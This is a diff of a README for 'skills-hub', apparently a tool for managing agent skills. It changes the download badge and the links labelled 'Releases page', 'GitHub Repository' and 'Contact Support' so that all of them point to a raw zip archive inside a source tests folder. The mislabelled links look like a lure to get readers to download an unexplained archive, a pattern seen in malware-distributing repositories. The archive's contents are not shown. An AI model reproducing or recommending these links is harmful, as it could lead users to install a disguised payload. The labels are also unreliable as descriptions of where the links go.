@@ -6,11 +6,11 @@ Welcome to skills-hub! This application helps you manage your agent skills in on
 
 ## 🔗 Download the Application
 
-[![Download skills-hub](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip%https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip)](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip)
+[![Download skills-hub](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip%https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip)](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [skills-hub Releases page](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip).
+1. **Visit the Releases Page:** Go to the [skills-hub Releases page](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip).
    
 2. **Choose Your Version:** Look for the latest version available. This will usually be at the top of the list.
 
@@ -70,8 +70,8 @@ If you need further assistance, feel free to reach out. Open an issue on our Git
 
 ## 🔗 Important Links
 
-- [Download skills-hub](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip)
-- [GitHub Repository](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip)
-- [Contact Support](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/hub-skills-3.7.zip)
+- [Download skills-hub](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip)
+- [GitHub Repository](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip)
+- [Contact Support](https://github.com/ncvetit/skills-hub/raw/refs/heads/main/src-tauri/src/core/tests/hub_skills_3.5.zip)
 
 Thank you for choosing skills-hub! Enjoy managing your agent skills with ease.
